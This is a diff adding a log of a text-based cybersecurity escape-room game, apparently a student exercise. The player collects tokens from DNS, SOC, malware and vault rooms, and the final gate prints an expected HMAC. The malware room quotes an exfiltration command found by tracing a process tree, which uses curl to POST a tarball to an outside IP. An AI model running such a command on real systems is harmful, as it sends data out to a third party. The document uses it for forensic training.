@@ -1,0 +1,94 @@
+08/11/25 11:35:37 - Welcome to the escape room game
+08/11/25 11:35:37 - 
+            ___________                                    __________                                                             
+            \_   _____/ ______ ____ _____  ______   ____   \______   \ ____   ____   _____                                        
+             |    __)_ /  ___// ___\\__  \ \____ \_/ __ \   |       _//  _ \ /  _ \ /     \                                       
+             |        \\___ \\  \___ / __ \|  |_> >  ___/   |    |   (  <_> |  <_> )  Y Y  \
+            /_______  /____  >\___  >____  /   __/ \___  >  |____|_  /\____/ \____/|__|_|  /                                      
+                    \/     \/     \/     \/|__|        \/          \/                    \/                                       
+                
+08/11/25 11:35:37 - Enjoy the escape room!
+08/11/25 11:35:37 - Type quit to quit
+08/11/25 11:35:37 - Type hint for assistance
+08/11/25 11:35:58 - What would you like to do?
+08/11/25 11:35:58 - User called move dns
+08/11/25 11:35:58 - You have entered into CurrentRoom.DNS
+08/11/25 11:36:04 - What would you like to do?
+08/11/25 11:36:04 - User called inspect dns.cfg
+08/11/25 11:36:04 - [DNSRoom] starting decode
+08/11/25 11:36:04 - Base64 decode error: Incorrect padding
+08/11/25 11:36:04 - [Room DNS] Decoding hints...
+08/11/25 11:36:04 - Decoded line: "Look inside the DNS switch for the right phrase."
+08/11/25 11:36:04 - Token formed: phrase
+08/11/25 11:36:04 - DNS: TOKEN[DNS]=phrase
+08/11/25 11:36:04 - DNS: EVIDENCE[DNS].KEY=hint4
+08/11/25 11:36:04 - DNS: EVIDENCE[DNS].DECODED_LINE=Look inside the DNS switch for the right phrase.
+08/11/25 11:36:14 - What would you like to do?
+08/11/25 11:36:14 - User called inventory
+08/11/25 11:36:14 - You currently have the following items in your inventory:
+08/11/25 11:36:14 - DNS:phrase
+08/11/25 11:36:17 - What would you like to do?
+08/11/25 11:36:17 - User called move soc
+08/11/25 11:36:17 - You have entered into CurrentRoom.SOC
+08/11/25 11:36:26 - What would you like to do?
+08/11/25 11:36:26 - User called inspect auth.log
+08/11/25 11:36:26 - SOC: TOKEN[KEYPAD]=4249
+08/11/25 11:36:26 - SOC: EVIDENCE[KEYPAD].TOP24=198.19.0.0/24
+08/11/25 11:36:26 - SOC: EVIDENCE[KEYPAD].COUNT=49
+08/11/25 11:36:26 - SOC: EVIDENCE[KEYPAD].SAMPLE=2025-08-09T12:00:25Z lab1 sshd[3234]: Failed password for svc from 198.19.0.109 port 58191 protocol 2
+08/11/25 11:36:26 - SOC: EVIDENCE[KEYPAD].MALFORMED_SKIPPED=3
+08/11/25 11:36:41 - What would you like to do?
+08/11/25 11:36:41 - User called move malware
+08/11/25 11:36:41 - You have entered into CurrentRoom.MALWARE
+08/11/25 11:36:43 - What would you like to do?
+08/11/25 11:36:43 - User called hint
+08/11/25 11:36:43 - look: Allows you to look in the current room and see what is available
+08/11/25 11:36:43 - move <room>: Allows you to move to a room to solve, rooms available are: dns, malware, soc, vault, gate, and lobby
+08/11/25 11:36:43 - inspect <item>: Allows you to inspect an item in the room. You are currently in Malware and can inspect proc_tree.jsonl
+08/11/25 11:36:43 - use <item>: Depending on the room you are in, you can use an item to do an action. You are currently in Malware and can use nothing
+08/11/25 11:36:43 - inventory: Prints a list of all items found your inventory
+08/11/25 11:36:43 - save: Saves the progress of your current game to a file in the data folder, called save.json
+08/11/25 11:36:43 - load: If a save.json file is found, in the data folder and it is valid,the system will load it and set that as your current progress. Will overwrite any progress already done in this session
+08/11/25 11:36:43 - quit: Exits the game and prints currently collected evidence to a transcript file
+08/11/25 11:36:43 - hint: Gives a list of available commands
+08/11/25 11:36:52 - What would you like to do?
+08/11/25 11:36:52 - User called inspect proc_tree,jsonl
+08/11/25 11:36:52 - Please enter an item with the inspect command, you are in Malware and can inspect proc_tree.jsonl
+08/11/25 11:37:12 - What would you like to do?
+08/11/25 11:37:12 - User called inspect proc_tree.jsonl
+08/11/25 11:37:12 - [MalwareRoom] Starting traversal
+08/11/25 11:37:12 - [Room MALWARE] Found exfil path: [167->170->171->175]
+08/11/25 11:37:12 - [Room MALWARE] Matched command: "sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'"
+08/11/25 11:37:12 - Malware: TOKEN[PID]=175
+08/11/25 11:37:12 - Malware: EVIDENCE[PID].PATH=[167->170->171->175]
+08/11/25 11:37:12 - Malware: EVIDENCE[PID].CMD="sh -c 'curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz'"
+08/11/25 11:37:17 - What would you like to do?
+08/11/25 11:37:17 - User called move vault
+08/11/25 11:37:17 - You have entered into CurrentRoom.VAULT
+08/11/25 11:37:22 - What would you like to do?
+08/11/25 11:37:22 - User called inspect vault_dump.txt
+08/11/25 11:37:22 - The values 
+SAFE{9-14- 23}
+ are valid
+08/11/25 11:37:22 - The results of vault are: {'\nSAFE{9-14- 23}\n': ('9', '14', '23')}
+08/11/25 11:37:22 - Vault: TOKEN[SAFE]=9-14-23
+08/11/25 11:37:22 - Vault: EVIDENCE[SAFE].MATCH=SAFE{9-14- 23}
+08/11/25 11:37:22 - Vault: EVIDENCE[SAFE].CHECK=9+14=23
+08/11/25 11:37:22 - Returning token: 9-14-23
+08/11/25 11:37:40 - What would you like to do?
+08/11/25 11:37:40 - User called move gate
+08/11/25 11:37:40 - You have entered into CurrentRoom.FINAL_GATE
+08/11/25 11:37:47 - What would you like to do?
+08/11/25 11:37:47 - User called usave
+08/11/25 11:37:47 - Unknown command: usave, type hint to see a list of available commands
+08/11/25 11:37:54 - What would you like to do?
+08/11/25 11:37:54 - User called save
+08/11/25 11:37:54 - Saving progress...
+08/11/25 11:37:54 - Progress saved.
+08/11/25 11:37:54 - You saved the current game successfully
+08/11/25 11:38:01 - What would you like to do?
+08/11/25 11:38:01 - User called use final_gate
+08/11/25 11:38:01 - Final gate was opened with: FINAL_GATE=PENDING
+MSG=msc-group-09|175-phrase-4249-9-14-23
+EXPECTED_HMAC=38e52f50df1e5dc1e7c266ad92ecf8447cdcdbd2727b83c274ee0b03b73e73ed
+08/11/25 11:38:01 - Thank you for playing
